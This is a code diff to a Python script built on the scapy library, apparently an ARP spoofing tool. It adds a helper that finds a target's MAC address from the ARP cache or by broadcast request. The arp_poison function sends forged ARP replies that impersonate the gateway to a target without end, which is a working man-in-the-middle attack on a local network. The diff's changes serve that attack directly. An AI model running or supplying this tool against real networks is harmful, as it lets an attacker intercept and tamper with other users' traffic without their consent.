@@ -2,14 +2,16 @@ import os
 import sys
 import time
 import threading
-from scapy.layers.l2 import ARP
+from scapy.layers.l2 import ARP, Ether, srp1
 from scapy.sendrecv import send
 from termcolor import colored
 
 
 def arp_poison(target_ip, gateway_ip, interval):
-    # Get MAC address of target
-    target_mac = ARP(pdst=target_ip).hwsrc
+    if target_ip == ARP().psrc:
+        target_mac = ARP().hwsrc  # Return MAC address of machine
+    else:
+        target_mac = get_target_mac(target_ip)  # Get MAC address of target
 
     # Construct ARP packet
     arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation
@@ -17,7 +19,7 @@ def arp_poison(target_ip, gateway_ip, interval):
     # Indefinitely send packets
     while True:
         send(arp, verbose=0)
-        print(colored("[ARP] Sent packet to {} from {}".format(target_ip, gateway_ip), "light_grey"))
+        print(colored("[ARP] Sent packet to {} / {} from {}".format(target_ip, target_mac, gateway_ip), "light_grey"))
         time.sleep(interval)
 
 
@@ -29,6 +31,30 @@ def get_gateway_ip():
         return os.popen("ipconfig | findstr Default").read().split()[-1]
     else:  # Linux
         return os.popen("route -n | grep 'UG[ \t]' | awk '{print $2}'").read().strip()
+
+
+def get_target_mac(target_ip):
+    # Check ARP cache for target MAC address
+    cache = os.popen("arp -a {}".format(target_ip)).read().split()
+    if sys.platform == "win32":
+        if len(cache) > 4:
+            return cache[-2].replace("-", ":")
+    else:
+        if len(cache) > 7:
+            return cache[3]
+
+    # Create ARP request packet
+    ether_broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request = ARP(pdst=target_ip)
+    broadcast_arp = ether_broadcast / arp_request
+
+    # Send ARP request and listen for valid response
+    while True:
+        response = srp1(broadcast_arp, verbose=False)
+        if response.psrc == target_ip:
+            return response.hwsrc
+        else:
+            time.sleep(5)
 
 
 def start(target, interval, gateway=None):
